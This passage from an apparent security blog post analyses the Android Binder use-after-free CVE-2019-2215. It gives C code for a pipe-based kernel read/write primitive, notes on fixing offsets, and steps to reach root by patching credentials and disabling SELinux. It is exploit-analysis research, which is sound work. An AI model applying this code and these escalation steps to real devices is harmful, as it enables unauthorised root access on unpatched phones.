writing data from an arbitrary kernel address to a pipe, and calling <code>read()</code> on the other end of the pipe, we can pipe data from an arbitrary kernel address. Boom, arbitrary read/write!</p><pre><code class=\"language-c\">int kernel_rw_pipe[2];\n\n//...\n\nif(pipe(kernel_rw_pipe))\n    exitWithError(\"Kernel R/W Pipe failed: %s\", strerror(errno));\n\n//...\n\nvoid kernel_write(unsigned long kaddr, void *data, size_t len)\n{\n    if(len &gt; 0x1000)\n        exitWithError(\"Reads/writes over the size of a page results causes issues.\");\n    \n    if(write(kernel_rw_pipe[1], data, len) != len)\n        exitWithError(\"Failed to write data to kernel (write)!\");\n    \n    if(read(kernel_rw_pipe[0], (void *)kaddr, len) != len)\n        exitWithError(\"Failed to write data to kernel (read)!\");\n}\n\nvoid kernel_read(unsigned long kaddr, void *data, size_t len)\n{\n    if(len &gt; 0x1000)\n        exitWithError(\"Reads/writes over the size of a page results causes issues.\");\n    \n    if(write(kernel_rw_pipe[1], (void *)kaddr, len) != len)\n        exitWithError(\"Failed to read data from kernel (write)!\");\n    \n    if(read(kernel_rw_pipe[0], data, len) != len)\n        exitWithError(\"Failed to read data from kernel (read)!\");\n}\n</code></pre><h2 id=\"additional-notes\">Additional Notes</h2><p>Some devices (even if they're vulnerable) may fail on the <code>writev()</code> in the leak call, as it'll return 0x1000 instead of the desired 0x2000. This is usually because the offset for the waitqueue is incorrect, therefore the second <code>iovec.iov_base</code> isn't getting smashed with a kernel pointer. This will cause the call to return 0x1000 because the second request will fail, since <code>0xdeadbeef</code> is an unmapped address.</p><p>In this case, you'll have to extract the kernel image for the version you're targeting and pull the proper offsets (or potentially bruteforce it).</p><h2 id=\"conclusion\">Conclusion</h2><p>Once you have kernel read/write, it's basically game over. A root shell is a <code>cred</code> patch away. If you're not on a Samsung device, you can take it a step further and disable SELinux and patch the <code>init_task</code> credentials so every new process that launches post-exploit automatically launches with full privileges. On Samsung devices, I do not believe this is possible without extra work due to their Knox mitigation. On most other devices though, these additional patches shouldn't be an issue.</p><p>It's worth noting that p0's exploit is remarkably stable. It very rarely fails, and when it does it's usually just an error, not a kernel panic, so you just need to run the exploit again and you're good to go. This makes it an awesome temporary root method for people with OEM locked bootloaders like me.</p><p>Overall, I thought this exploit strategy by Jann Horn and Maddie Stone was pretty novel, and I definitely learned a lot breaking it down. It gave me a fresh perspective on use-after-free's, demonstrating that you're not totally out of luck if you can't get a useful primitive from the UAF'd object itself.</p><h2 id=\"references-additional-resources\">References / Additional Resources</h2><p><a href=\"https://bugs.chromium.org/p/project-zero/issues/detail?id=1942\">Issue 1942: Android; Use-After-Free in Binder driver (Chromium Bug Tracker) </a></p><p><a href=\"https://bugs.chromium.org/p/project-zero/issues/attachmentText?aid=414885\">Project Zero Exploit</a></p><p><a href=\"https://groups.google.com/forum/#!msg/syzkaller-bugs/QyXdgUhAF50/g-FXVo1OAwAJ\">Syzkaller kASAN report</a></p><p><a href=\"https://elixir.bootlin.com/linux/v4.4.177/source\">Bootlin Linux kernel source browser</a></p><h2 id=\"credit\">Credit</h2><p>Jann Horn and Maddie Stone for the exploit code referenced in the write-up.</p>","authors":[{"name":"Specter","slug":"specter","profile_image":"https://dayzerosec.com/content/images/2019/11/specter-1.png"}],"tags":[{"id":"5dc5c3de35d7ab0001e53693","title":"Exploit Analysis","url":"https://dayzerosec.com/tag/exploit-analysis/","path":"exploit-analysis"},{"id":"5dc63b9098d37b00011780fd","title":"Android","url":"https://dayzerosec.com/tag/android/","path":"android"}],"slug":"analyzing-androids-cve-2019-2215-dev-binder-uaf"}}]}}},"context":{}}